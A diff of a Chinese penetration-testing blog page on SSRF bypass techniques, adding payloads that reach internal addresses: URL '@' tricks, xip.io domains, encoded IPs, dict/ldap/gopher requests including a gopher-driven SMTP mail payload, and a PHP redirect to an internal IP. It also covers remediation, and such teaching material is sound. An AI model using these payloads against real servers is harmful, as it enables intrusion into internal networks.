@@ -17,23 +17,23 @@
   <meta http-equiv="window-target" content="_top">
   
   
-  <title>SSRF绕过的方法 | VK&#39;Blog</title>
-  <meta name="description" content="1、SSRF 1.1、描述： 1.2、漏洞寻找： 1.3 漏洞验证 1.4 利用方式 1.5、漏洞利用示例： 1.6、Bypass 1.7 SSRF危害 1.8 漏洞修复      1、SSRF1.1、描述： SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF 攻击的目标是从外网无法访问的">
+  <title>SSRF绕过的方法 | VK&#39;Blog|博客</title>
+  <meta name="description" content="1、SSRF 1.1、描述： 1.2、漏洞寻找： 1.3 漏洞验证 1.4 利用方式 1.5、漏洞利用示例： 1.6、Bypass 1.7 SSRF危害 1.8 漏洞修复 1.9 参考文章      1、SSRF1.1、描述： SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF 攻击的目标">
 <meta name="keywords" content="WEB渗透测试">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SSRF绕过的方法">
 <meta property="og:url" content="http://www.vkxss.top/2019/07/19/渗透测试-SSRF绕过的方法/index.html">
 <meta property="og:site_name" content="VK&#39;s blog">
-<meta property="og:description" content="1、SSRF 1.1、描述： 1.2、漏洞寻找： 1.3 漏洞验证 1.4 利用方式 1.5、漏洞利用示例： 1.6、Bypass 1.7 SSRF危害 1.8 漏洞修复      1、SSRF1.1、描述： SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF 攻击的目标是从外网无法访问的">
+<meta property="og:description" content="1、SSRF 1.1、描述： 1.2、漏洞寻找： 1.3 漏洞验证 1.4 利用方式 1.5、漏洞利用示例： 1.6、Bypass 1.7 SSRF危害 1.8 漏洞修复 1.9 参考文章      1、SSRF1.1、描述： SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF 攻击的目标">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://ae01.alicdn.com/kf/Hbf43dfb33cbc43939b24042c7530c24fR.jpg">
 <meta property="og:image" content="https://ae01.alicdn.com/kf/H8a618cf2914f452aa323c5c7e921d91c9.jpg">
 <meta property="og:image" content="https://ae01.alicdn.com/kf/H8595608792b545259736dcaa13594142U.jpg">
 <meta property="og:image" content="https://ae01.alicdn.com/kf/Hb286c698c7a44e9fa59db20af8adfc82L.jpg">
-<meta property="og:updated_time" content="2019-09-20T02:01:48.186Z">
+<meta property="og:updated_time" content="2019-10-17T14:57:40.371Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SSRF绕过的方法">
-<meta name="twitter:description" content="1、SSRF 1.1、描述： 1.2、漏洞寻找： 1.3 漏洞验证 1.4 利用方式 1.5、漏洞利用示例： 1.6、Bypass 1.7 SSRF危害 1.8 漏洞修复      1、SSRF1.1、描述： SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF 攻击的目标是从外网无法访问的">
+<meta name="twitter:description" content="1、SSRF 1.1、描述： 1.2、漏洞寻找： 1.3 漏洞验证 1.4 利用方式 1.5、漏洞利用示例： 1.6、Bypass 1.7 SSRF危害 1.8 漏洞修复 1.9 参考文章      1、SSRF1.1、描述： SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF 攻击的目标">
 <meta name="twitter:image" content="https://ae01.alicdn.com/kf/Hbf43dfb33cbc43939b24042c7530c24fR.jpg">
   <!-- Canonical links -->
   <link rel="canonical" href="http://www.vkxss.top/2019/07/19/渗透测试-SSRF绕过的方法/index.html">
@@ -366,10 +366,10 @@
         <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2019/07/19/渗透测试-SSRF绕过的方法/#comments" class="article-comment-link">评论</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 2.9k(字)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 3.2k(字)</span>
 	
 	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 11(分)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 13(分)</span>
 	
 
       </div>
@@ -388,6 +388,7 @@
 <li><a href="#16-bypass">1.6、Bypass</a></li>
 <li><a href="#17-ssrf危害">1.7 SSRF危害</a></li>
 <li><a href="#18-漏洞修复">1.8 漏洞修复</a></li>
+<li><a href="#19-参考文章">1.9 参考文章</a></li>
 </ul>
 </li>
 </ul>
@@ -503,17 +504,17 @@
 <ul>
 <li><font face="微软雅黑">1.4.3利用@</font></li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com@127.0.0.1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com@127.0.0.1</span><br><span class="line">http://A.com:B@127.0.0.1</span><br><span class="line">127.0.0.1#http://abc</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><font face="微软雅黑">1.4.4利用短地址</font></li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）百度短网址转换：https://dwz.cn		#不支持ip</span><br><span class="line">    http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1</span><br><span class="line">    </span><br><span class="line">（2）TinyURL：https://tinyurl.com/create.php		#支持ip</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><font face="微软雅黑">1.4.5利用特殊域名</font></li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用的原理是DNS解析</span><br><span class="line">http://127.0.0.1.xip.io/</span><br><span class="line">http://www.owasp.org.127.0.0.1.xip.io/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">利用的原理是DNS解析</span><br><span class="line">http://127.0.0.1.xip.io/</span><br><span class="line">http://www.owasp.org.127.0.0.1.xip.io/</span><br><span class="line">http://mysite.127.0.0.1.xip.io</span><br><span class="line">http://foo.bar.127.0.0.1.xip.io</span><br><span class="line">#利用</span><br><span class="line">ssrf.php?url=http://127.0.0.1.xip.io/</span><br><span class="line">or</span><br><span class="line">ssrf.php?url=http://www.127.0.0.1.xip.io/</span><br><span class="line">or</span><br><span class="line">ssrf.php?url=http://evi1.cn.127.0.0.1.xip.io/</span><br><span class="line">or</span><br><span class="line">ssrf.php?url=dict://evi1.cn.127.0.0.1.xip.io:22/info</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><font face="微软雅黑">1.4.6 利用DNS解析</font></li>
@@ -541,7 +542,9 @@
 <ul>
 <li><font face="微软雅黑">1.4.10 利用进制转换<br>  – IP进制转换地址：<a href="../../../../scale.html">转换地址</a></font></li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">可以是十六进制，八进制等。</span><br><span class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</span><br><span class="line">首先把这四段数字给分别转成16进制，结果：73 ef d2 1a</span><br><span class="line">然后把 73efd21a 这十六进制一起转换成8进制</span><br><span class="line">记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IP转换为-16进制-记得访问的时候加0X表示使用16进制</span><br><span class="line">http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://0X7F000001</span><br><span class="line"></span><br><span class="line">IP转换为-16进制-转换为八进制-记得访问的时候加0表示使用八进制</span><br><span class="line">http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://17700000001&gt;&gt;&gt;http://017700000001</span><br><span class="line"></span><br><span class="line">127转换为8进制：</span><br><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://0177.0.0.1/</span><br><span class="line"></span><br><span class="line">ip地址转换为10进制：</span><br><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://2130706433/</span><br><span class="line">http://192.168.0.1  &gt;&gt;&gt;  http://3232235521/</span><br><span class="line">http://192.168.1.1  &gt;&gt;&gt;  http://3232235777/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">可以是十六进制，八进制等。</span><br><span class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</span><br><span class="line">首先把这四段数字给分别转成16进制，结果：73 ef d2 1a</span><br><span class="line">然后把 73efd21a 这十六进制一起转换成8进制</span><br><span class="line">记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</span><br><span class="line"></span><br><span class="line">IP转换为-16进制-记得访问的时候加0X表示使用16进制</span><br><span class="line">http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://0X7F000001</span><br><span class="line"></span><br><span class="line">IP转换为-16进制-转换为八进制-记得访问的时候加0表示使用八进制</span><br><span class="line">http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://17700000001&gt;&gt;&gt;http://017700000001</span><br><span class="line"></span><br><span class="line">127转换为8进制：</span><br><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://0177.0.0.1/</span><br><span class="line"></span><br><span class="line">ip地址转换为10进制：</span><br><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://2130706433/</span><br><span class="line">http://192.168.0.1  &gt;&gt;&gt;  http://3232235521/</span><br><span class="line">http://192.168.1.1  &gt;&gt;&gt;  http://3232235777/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#ip:127.0.0.1</span><br><span class="line"></span><br><span class="line">（1）8进制格式：0177.0.0.1</span><br><span class="line">（2）16进制格式：0x7F.00.00.01</span><br><span class="line">（3）8进制整数格式：017700000001</span><br><span class="line">（3）10进制整数格式：2130706433</span><br><span class="line">（4）16进制整数格式：0x7f000001</span><br><span class="line"></span><br><span class="line">#转换方法</span><br><span class="line"></span><br><span class="line">8进制前加0，16进制前加0x</span><br><span class="line">将ip的每一位由十进制转换为二进制，再将二进制转换为八进制或十六进制</span><br><span class="line">关于整数格式：ipv4是32位二进制数，将其转换为32位二进制数，再将其转换为十进制或十六进制</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><font face="微软雅黑">1.4.11 利用特殊地址</font></li>
@@ -554,7 +557,12 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dict://</span><br><span class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class="line">ssrf.php?url=dict://attacker:11111/</span><br><span class="line">SFTP://</span><br><span class="line">ssrf.php?url=sftp://example.com:11111/</span><br><span class="line">TFTP://</span><br><span class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</span><br><span class="line">LDAP://</span><br><span class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</span><br><span class="line">Gopher://</span><br><span class="line">ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><font face="微软雅黑">1.4.13 使用组合</font></li>
+<li><font face="微软雅黑">1.4.13 利用301或者302跳转</font></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.th1s.cn/test/ssrf.php</span><br><span class="line">ssrf.php里面的内容为：</span><br><span class="line">&lt;?php header(&apos;Location:10.1.1.1&apos;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><font face="微软雅黑">1.4.14 使用组合</font></li>
 </ul>
 <p>各种绕过进行自由组合即可</p>
 <p>参考链接：</p>
@@ -580,6 +588,13 @@
 </li>
 <li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
 </li>
+</ul>
+<h2><span id="19-参考文章">1.9 参考文章</span></h2><ul>
+<li><a href="https://www.evi1.cn/post/ssrf/" target="_blank" rel="noopener">SSRF学习笔记</a></li>
+<li><a href="https://www.evi1.cn/post/ssrf/" target="_blank" rel="noopener">ssrf攻击内网应用</a></li>
+<li><a href="https://v0w.top/2018/11/23/SSRF-notes/#Some-Tricks-in-SSRF" target="_blank" rel="noopener">SSRF 学习笔记</a></li>
+<li><a href="https://www.jianshu.com/p/949a2cb3be36?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">gopher 协议攻击内网 mysql</a></li>
+<li><a href="https://www.smi1e.top/gopher-ssrf攻击内网应用复现/" target="_blank" rel="noopener">gopher SSRF攻击内网应用复现</a></li>
 </ul>
 
       
